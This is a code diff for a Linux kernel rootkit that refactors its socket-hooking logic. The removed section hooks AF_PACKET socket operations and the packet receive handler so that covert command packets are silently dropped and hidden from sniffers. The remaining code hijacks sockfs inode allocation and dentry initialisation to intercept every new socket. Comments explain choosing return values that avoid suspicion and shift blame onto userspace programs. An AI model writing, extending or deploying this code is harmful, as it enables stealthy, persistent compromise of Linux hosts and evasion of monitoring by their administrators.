@@ -4,161 +4,14 @@
 #include <linux/workqueue.h>
 #include <linux/fs.h>
 #include <linux/list.h>
-#include <linux/hashtable.h>
 
 #include "headers/networking.h"
-#include "headers/packet_headers/internal.h"
 
-struct hooked_socket_entry {
-    struct hlist_node node;
-    struct hlist_node prot_hook_node;
-    struct socket *sock;
-    const struct proto_ops *original_packet_ops;
-    int (*original_packet_rcv)(struct sk_buff *skb, struct net_device *dev,
-		                       struct packet_type *pt, struct net_device *orig_dev);
-};
+#include "socket/af_packet_internal.h"
+#include "socket/packet_hook.h"
+#include "socket/hook.h"
 
-struct hooked_socket_entry *get_socket_hook(struct socket *sock);
-struct hooked_socket_entry *get_socket_hook_by_prot_hook(struct packet_type *pt);
-void hook_packet_sock(struct socket *sock);
-int release_socket_hook(struct socket *sock);
-
-static DEFINE_SPINLOCK(hook_packet_lock);
-
-static int hooked_packet_setsockopt(struct socket *sock, int level, int optname,
-		                            char __user *optval, unsigned int optlen)
-{
-    int result;
-    unsigned long _flags;
-    struct hooked_socket_entry *sock_hook = get_socket_hook(sock);
-
-    // This case shouldn't happen, but if it does, the userspace program is likely to break.
-    // Returning 0 means the syscall will not be very suspicious without heavy debugging, 
-    // the immidiete suspect will be the userspace program, instead of the kernel.
-    // TODO: Add a panic method that will remove the rootkit if this happends.
-    if (!sock_hook) return 0;
-
-    result = sock_hook->original_packet_ops->setsockopt(sock, level, optname, optval, optlen);
-    spin_lock_irqsave(&hook_packet_lock, _flags);
-    hook_packet_sock(sock);
-	spin_unlock_irqrestore(&hook_packet_lock, _flags);
-    return result;
-}
-
-
-static int hooked_packet_release(struct socket *sock)
-{
-    int result;
-    struct hooked_socket_entry *sock_hook = get_socket_hook(sock);
-
-    // This case shouldn't happen, but if it does, the userspace program is likely to break.
-    // Returning 0 means the syscall will not be very suspicious without heavy debugging, 
-    // the immidiete suspect will be the userspace program, instead of the kernel.
-    // TODO: Add a panic method that will remove the rootkit if this happends.
-    if (!sock_hook) return 0;
-
-    result = sock_hook->original_packet_ops->release(sock);
-    release_socket_hook(sock);
-    return result;
-}
-
-static int hooked_packet_rcv(struct sk_buff *skb, struct net_device *dev,
-		      struct packet_type *pt, struct net_device *orig_dev)
-{
-    struct hooked_socket_entry *sock_hook = get_socket_hook_by_prot_hook(pt);
-
-    if (is_skb_cmd(skb)) {
-        kfree_skb(skb);
-        return 0;
-    }
-
-    // This case shouldn't happen, but if it does, the userspace program is likely to break.
-    // Returning 0 means the syscall will not be very suspicious without heavy debugging, 
-    // the immidiete suspect will be the userspace program, instead of the kernel.
-    // TODO: Add a panic method that will remove the rootkit if this happends.
-    if (!sock_hook) return 0;
-
-    return sock_hook->original_packet_rcv(skb, dev, pt, orig_dev);
-}
-
-static DEFINE_HASHTABLE(hooked_sockets, 8);
-static DEFINE_HASHTABLE(hooked_sockets_by_prot_hook, 8);
-
-struct hooked_socket_entry *get_socket_hook(struct socket *sock) {
-    struct hooked_socket_entry *sock_hook;
-
-    hash_for_each_possible(hooked_sockets, sock_hook, node, (uintptr_t)sock) {
-        if (sock_hook->sock == sock) return sock_hook;
-    }
-    return 0;
-}
-
-struct hooked_socket_entry *get_socket_hook_by_prot_hook(struct packet_type *pt) {
-    struct hooked_socket_entry *sock_hook;
-
-    hash_for_each_possible(hooked_sockets_by_prot_hook, sock_hook, prot_hook_node, (uintptr_t)pt) {
-        if (&pkt_sk(sock_hook->sock->sk)->prot_hook == pt) return sock_hook;
-    }
-    return 0;
-}
-
-// TODO: split the generic socket hook into a seperate file.
-
-struct hooked_socket_entry *get_or_create_socket_hook(struct socket *sock, struct proto_ops **hooked_ops) {
-    struct packet_sock *po = pkt_sk(sock->sk);
-    struct hooked_socket_entry *sock_hook;
-
-    if ((sock_hook = get_socket_hook(sock))) {
-        *hooked_ops = (struct proto_ops *)sock->ops;
-        return sock_hook;
-    }
-
-    sock_hook = kmalloc(sizeof(struct hooked_socket_entry), GFP_KERNEL);
-
-    sock_hook->sock = sock;
-    sock_hook->original_packet_ops = sock->ops;
-    sock_hook->original_packet_rcv = po->prot_hook.func;
-    
-    *hooked_ops = kmalloc(sizeof(struct proto_ops), GFP_KERNEL);
-    memcpy(*hooked_ops, sock_hook->original_packet_ops, sizeof(struct proto_ops));
-    sock->ops = *hooked_ops;
-
-    (*hooked_ops)->release = hooked_packet_release;
-
-    hash_add(hooked_sockets, &sock_hook->node, (uintptr_t)sock);
-    hash_add(hooked_sockets_by_prot_hook, &sock_hook->prot_hook_node, (uintptr_t)(&pkt_sk(sock->sk)->prot_hook));
-    return sock_hook;
-}
-
-int release_socket_hook(struct socket *sock) {
-    struct hooked_socket_entry *sock_hook = get_socket_hook(sock);
-
-    if (!sock_hook)  {
-        // TODO: panic.
-        return -1;
-    }
-
-    hash_del(&sock_hook->node);
-    hash_del(&sock_hook->prot_hook_node);
-    kfree(sock_hook);
-    return 0;
-
-}
-
-void hook_packet_sock(struct socket *sock) {
-    struct proto_ops *hooked_ops;
-    get_or_create_socket_hook(sock, &hooked_ops);
-
-    hooked_ops->setsockopt = hooked_packet_setsockopt;
-    pkt_sk(sock->sk)->prot_hook.func = hooked_packet_rcv;
-}
-
-int is_packet_sock(struct socket *sock) {
-    if (!sock->sk) return 0;
-    return sock->sk->sk_family == PF_PACKET;
-}
-
-int my_wake_up(struct wait_queue_entry *wq_entry, unsigned mode, int flags, void *key) {
+int hooked_wake_up(struct wait_queue_entry *wq_entry, unsigned mode, int flags, void *key) {
     unsigned long _flags;
     struct socket *sock = (struct socket *)wq_entry->private;
     
@@ -181,7 +34,7 @@ static LIST_HEAD(unhooked_sockets);
 
 static struct inode *(*original_alloc_inode)(struct super_block *sb);
 
-static struct inode *new_alloc_inode(struct super_block *sb) {
+static struct inode *hooked_alloc_inode(struct super_block *sb) {
     struct inode *res;
     struct socket *sock;
     struct wait_queue_entry *wq;
@@ -192,7 +45,7 @@ static struct inode *new_alloc_inode(struct super_block *sb) {
 
     /* Add wait queue entry */
     wq = kmalloc(sizeof(struct wait_queue_entry), GFP_KERNEL);
-    init_waitqueue_func_entry(wq, &my_wake_up);
+    init_waitqueue_func_entry(wq, &hooked_wake_up);
     wq->private = sock;
     add_wait_queue(&sock->wq.wait, wq);
 
@@ -206,7 +59,7 @@ static struct inode *new_alloc_inode(struct super_block *sb) {
 
 static DEFINE_SPINLOCK(unhooked_sockets_lock);
 
-static int my_d_init(struct dentry *dentry)
+static int hooked_d_init(struct dentry *dentry)
 {
     struct unhooked_socket_entry *s_entry;
     struct unhooked_socket_entry *temp;
@@ -235,8 +88,7 @@ int MRK_init_sockets_hook(void) {
     struct super_operations *s_op;
     struct dentry_operations *s_d_op;
 
-    hash_init(hooked_sockets);
-    hash_init(hooked_sockets_by_prot_hook);
+    hook_init();
 
     fs_type = get_fs_type("sockfs");
 
@@ -245,13 +97,13 @@ int MRK_init_sockets_hook(void) {
         memcpy(s_op, super->s_op, sizeof(struct super_operations));
         super->s_op = s_op;
         original_alloc_inode = s_op->alloc_inode;
-        s_op->alloc_inode = &new_alloc_inode;
+        s_op->alloc_inode = &hooked_alloc_inode;
 
         s_d_op = (struct dentry_operations *)kmalloc(sizeof(struct dentry_operations), GFP_KERNEL);
         memcpy(s_d_op, super->s_d_op, sizeof(struct dentry_operations));
         super->s_d_op = s_d_op;
         
-        s_d_op->d_init = &my_d_init;
+        s_d_op->d_init = &hooked_d_init;
     }
     return 0;
 }
